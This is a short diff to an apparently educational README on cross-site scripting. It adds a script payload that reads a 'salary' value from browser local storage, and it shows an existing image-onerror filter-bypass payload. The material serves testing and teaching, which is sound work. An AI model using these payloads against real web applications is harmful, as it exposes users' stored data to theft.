@@ -13,6 +13,8 @@ Cross-Site-Scripting just for fun.
     - To include malicious javascript code in page.
   - **\<img src=anything onerror=alert(1) >**
     - When the **<script>** is being filtered by the Web Application, you can use javascript events.
+  - **<script>alert(localStorage.getItem('salary'))</script>**
+    - To collect sensitive information stored in Browser Local Storage.
  
 ## Automated Detection
   ## xss4fun.py
